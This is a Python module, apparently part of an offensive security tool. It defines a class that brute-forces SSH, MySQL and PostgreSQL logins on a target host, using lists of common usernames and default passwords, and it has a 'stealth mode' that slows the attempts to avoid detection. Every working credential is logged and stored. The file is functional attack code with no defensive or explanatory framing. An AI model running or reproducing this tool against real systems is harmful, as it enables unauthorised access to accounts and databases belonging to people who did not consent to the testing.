import socket
import time
from config import Config

class ServiceAttacks:
    def __init__(self, target, stealth_mode, logger):
        self.target = target
        self.stealth_mode = stealth_mode
        self.logger = logger
        self.credentials = {}
        
    def run_ssh_attack(self):
        """SSH brute force with clean error handling"""
        self.logger.scan("Checking SSH...")
        
        # Quick check if SSH is responsive
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if sock.connect_ex((self.target, 22)) != 0:
                self.logger.warning("SSH port closed - skipping")
                sock.close()
                return
            sock.close()
        except:
            self.logger.warning("SSH check failed - skipping")
            return
            
        users = ['root', 'admin', 'user', 'ubuntu', 'test']
        passwords = Config.DEFAULT_PASSWORDS[:20]
        
        for user in users:
            for password in passwords:
                try:
                    import paramiko
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    client.connect(
                        self.target, 
                        username=user, 
                        password=password, 
                        timeout=3,
                        allow_agent=False,
                        look_for_keys=False
                    )
                    self.logger.found(f"SSH credentials: {user}:{password}")
                    self.credentials['ssh'] = {'user': user, 'password': password}
                    client.close()
                    return
                except paramiko.AuthenticationException:
                    pass
                except paramiko.SSHException:
                    self.logger.warning("SSH protocol error - skipping")
                    return
                except socket.timeout:
                    self.logger.warning("SSH timeout - skipping")
                    return
                except ConnectionResetError:
                    self.logger.warning("SSH connection reset - skipping")
                    return
                except Exception:
                    pass
                finally:
                    try:
                        client.close()
                    except:
                        pass
                
                time.sleep(0.5 if not self.stealth_mode else 2)
        
        self.logger.info("SSH brute force completed - no credentials found")

    def run_db_attack(self, port: str, db_type: str):
        """Database brute force"""
        self.logger.scan(f"Checking {db_type} on port {port}...")
        
        users = ['root', 'admin', 'postgres', 'sa', 'test']
        passwords = Config.DEFAULT_PASSWORDS[:10]
        
        for user in users[:3]:
            for password in passwords:
                if self.test_db_connection(db_type, user, password):
                    self.logger.found(f"{db_type} credentials: {user}:{password}")
                    self.credentials[db_type] = {'user': user, 'password': password}
                    return
                time.sleep(0.5 if not self.stealth_mode else 2)

    def test_db_connection(self, db_type: str, user: str, password: str) -> bool:
        """Test database connection"""
        try:
            if db_type == 'mysql':
                import mysql.connector
                conn = mysql.connector.connect(
                    host=self.target,
                    user=user,
                    password=password,
                    connect_timeout=3
                )
                conn.close()
                return True
            elif db_type == 'postgresql':
                import psycopg2
                conn = psycopg2.connect(
                    host=self.target,
                    user=user,
                    password=password,
                    connect_timeout=3
                )
                conn.close()
                return True
        except:
            pass
        return False
